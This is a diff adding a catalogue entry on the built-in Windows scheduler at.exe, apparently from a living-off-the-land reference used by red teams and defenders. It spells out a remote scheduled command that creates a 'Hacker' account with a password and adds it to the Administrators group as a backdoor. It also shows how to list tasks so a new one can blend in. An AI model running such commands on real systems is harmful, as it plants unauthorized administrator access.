@@ -1,0 +1,28 @@
+---
+Name: at.exe
+Description: Schedules commands and programs to run on a computer at a specified time and date
+Updated: 2023-07-01
+Toolsets:
+  - Builtin
+Commands:
+  - Command: 'at.exe \\W10.ad.bitsadmin.com 06:00 cmd /c "net user Hacker H4ck#rt /add & net localgroup Administrators Hacker /add"'
+    Description: Execute task
+    Usecases:
+      - Create backdoor user or launch implant
+    Function: Execute
+    Comments:
+    MitreAttack:
+      - T1053.002
+  - Command: at.exe \\W10.ad.bitsadmin.com
+    Description: List tasks
+    Usecases:
+      - List current tasks to identify a name that can be used for a new task to blend in
+    Function: Recon
+    Comments:
+    MitreAttack:
+      - T1053.002
+Resources:
+Detections:
+Contributors:
+    - Name: Arris Huijgen
+      Handle: bitsadmin
